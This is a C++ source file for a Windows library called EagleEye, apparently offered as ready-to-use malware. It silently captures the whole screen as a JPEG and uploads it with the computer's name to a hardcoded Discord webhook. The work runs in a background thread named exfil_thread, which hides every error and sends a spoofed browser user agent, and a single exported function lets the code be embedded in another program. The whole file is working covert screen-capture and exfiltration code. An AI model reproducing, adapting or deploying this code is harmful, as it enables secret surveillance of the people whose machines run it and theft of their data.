// eagleeye.cpp — EagleEye Library Implementation
// No STL, no CRT dependencies, pure Win32 API. Silent failure.
#include "eagleeye.h"
#include <cstdint>
#include <cstdio>
#include <gdiplus.h>
#include <winhttp.h>
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

// Hardcoded Webhook URL
constexpr const char* WEBHOOK_URL = "PUT_YOUR_DISCORD_WEBHOOK_HERE";

namespace eagleeye {

    bool get_jpeg_clsid(CLSID* clsid) {
        UINT num = 0, size = 0;
        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0) return false;
        auto buf = static_cast<BYTE*>(HeapAlloc(GetProcessHeap(), 0, size));
        if (!buf) return false;
        auto encs = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buf);
        Gdiplus::GetImageEncoders(num, size, encs);
        bool found = false;
        for (UINT i = 0; i < num; i++) {
            if (wcscmp(encs[i].MimeType, L"image/jpeg") == 0) {
                *clsid = encs[i].Clsid;
                found = true;
                break;
            }
        }
        HeapFree(GetProcessHeap(), 0, buf);
        return found;
    }

    struct JpegData { uint8_t* data; size_t size; };

    JpegData capture_screenshot(ULONG quality) {
        JpegData result = { nullptr, 0 };
        Gdiplus::GdiplusStartupInput gdiStartup;
        ULONG_PTR gdiToken = 0;
        if (Gdiplus::GdiplusStartup(&gdiToken, &gdiStartup, nullptr) != Gdiplus::Ok) return result;

        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        if (w <= 0 || h <= 0) { Gdiplus::GdiplusShutdown(gdiToken); return result; }

        HDC screenDC = GetDC(nullptr);
        HDC memDC = CreateCompatibleDC(screenDC);
        HBITMAP hBmp = CreateCompatibleBitmap(screenDC, w, h);
        HBITMAP old = (HBITMAP)SelectObject(memDC, hBmp);
        BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY);
        SelectObject(memDC, old);

        Gdiplus::Bitmap* bmp = new Gdiplus::Bitmap(hBmp, nullptr);
        if (!bmp) {
            DeleteObject(hBmp); DeleteDC(memDC); ReleaseDC(nullptr, screenDC); Gdiplus::GdiplusShutdown(gdiToken);
            return result;
        }

        CLSID jpgClsid;
        bool ok = get_jpeg_clsid(&jpgClsid);

        Gdiplus::EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid = Gdiplus::EncoderQuality;
        params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        params.Parameter[0].NumberOfValues = 1;
        params.Parameter[0].Value = &quality;

        IStream* stream = nullptr;
        if (ok && CreateStreamOnHGlobal(nullptr, TRUE, &stream) == S_OK) {
            if (bmp->Save(stream, &jpgClsid, &params) == Gdiplus::Ok) {
                LARGE_INTEGER li; li.QuadPart = 0;
                stream->Seek(li, STREAM_SEEK_SET, nullptr);
                STATSTG stat;
                stream->Stat(&stat, STATFLAG_NONAME);
                size_t sz = static_cast<size_t>(stat.cbSize.QuadPart);
                if (sz > 0 && sz < 10 * 1024 * 1024) {
                    result.data = static_cast<uint8_t*>(HeapAlloc(GetProcessHeap(), 0, sz));
                    if (result.data) {
                        ULONG read = 0;
                        stream->Read(result.data, static_cast<ULONG>(sz), &read);
                        result.size = read;
                        if (read == 0) {
                            HeapFree(GetProcessHeap(), 0, result.data);
                            result.data = nullptr;
                        }
                    }
                }
            }
            stream->Release();
        }

        delete bmp;
        DeleteObject(hBmp);
        DeleteDC(memDC);
        ReleaseDC(nullptr, screenDC);
        Gdiplus::GdiplusShutdown(gdiToken);
        return result;
    }

    bool send_to_webhook(const uint8_t* jpeg_data, size_t jpeg_size, const char* pc_name) {
        wchar_t wurl[1024];
        MultiByteToWideChar(CP_UTF8, 0, WEBHOOK_URL, -1, wurl, 1024);

        URL_COMPONENTS urlComp;
        ZeroMemory(&urlComp, sizeof(urlComp));
        urlComp.dwStructSize = sizeof(urlComp);
        wchar_t hostName[256] = { 0 };
        wchar_t urlPath[1024] = { 0 };
        urlComp.lpszHostName = hostName;
        urlComp.dwHostNameLength = 255;
        urlComp.lpszUrlPath = urlPath;
        urlComp.dwUrlPathLength = 1023;

        if (!WinHttpCrackUrl(wurl, 0, 0, &urlComp)) return false;
        bool https = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

        const char* boundary = "----EagleEyeBoundary";

        // JSON payload for PC name
        char json_part[512];
        sprintf_s(json_part, sizeof(json_part),
            "--%s\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n"
            "Content-Type: application/json\r\n\r\n"
            "{\"content\":\"PC NAME: %s\"}\r\n", boundary, pc_name);

        // File header
        char file_header[256];
        sprintf_s(file_header, sizeof(file_header),
            "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screen.jpg\"\r\n"
            "Content-Type: image/jpeg\r\n\r\n", boundary);

        char footer[64];
        sprintf_s(footer, sizeof(footer), "\r\n--%s--\r\n", boundary);

        size_t j_len = strlen(json_part);
        size_t h_len = strlen(file_header);
        size_t f_len = strlen(footer);
        size_t total = j_len + h_len + jpeg_size + f_len;

        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;
        WinHttpSetTimeouts(hSession, 5000, 5000, 10000, 10000);

        HINTERNET hConnect = WinHttpConnect(hSession, hostName, https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, https ? WINHTTP_FLAG_SECURE : 0);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

        wchar_t ct[128];
        swprintf_s(ct, 128, L"Content-Type: multipart/form-data; boundary=%hs", boundary);
        WinHttpAddRequestHeaders(hRequest, ct, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

        bool ok = false;
        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, (DWORD)total, 0)) {
            DWORD written = 0;
            if (WinHttpWriteData(hRequest, json_part, (DWORD)j_len, &written)) {
                if (WinHttpWriteData(hRequest, file_header, (DWORD)h_len, &written)) {
                    const size_t CHUNK_SIZE = 8192;
                    size_t sent = 0;
                    bool send_ok = true;
                    while (sent < jpeg_size) {
                        size_t to_send = (jpeg_size - sent > CHUNK_SIZE) ? CHUNK_SIZE : (jpeg_size - sent);
                        if (!WinHttpWriteData(hRequest, jpeg_data + sent, (DWORD)to_send, &written)) {
                            send_ok = false;
                            break;
                        }
                        sent += to_send;
                    }
                    if (send_ok && WinHttpWriteData(hRequest, footer, (DWORD)f_len, &written)) {
                        if (WinHttpReceiveResponse(hRequest, nullptr)) {
                            DWORD statusCode = 0, sz = sizeof(statusCode);
                            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &sz, WINHTTP_NO_HEADER_INDEX);
                            ok = (statusCode >= 200 && statusCode < 300);
                        }
                    }
                }
            }
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return ok;
    }

    DWORD WINAPI exfil_thread(LPVOID) {
        __try {
            JpegData jpeg = capture_screenshot(75);
            if (jpeg.data) {
                char pc_name[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
                DWORD size = sizeof(pc_name);
                GetComputerNameA(pc_name, &size);

                send_to_webhook(jpeg.data, jpeg.size, pc_name);
                SecureZeroMemory(jpeg.data, jpeg.size);
                HeapFree(GetProcessHeap(), 0, jpeg.data);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // Silent failure
        }
        return 0;
    }

} // namespace eagleeye

extern "C" void eagleeyes() {
    HANDLE hThread = CreateThread(nullptr, 0, eagleeye::exfil_thread, nullptr, 0, nullptr);
    if (hThread) {
        CloseHandle(hThread);
    }
}
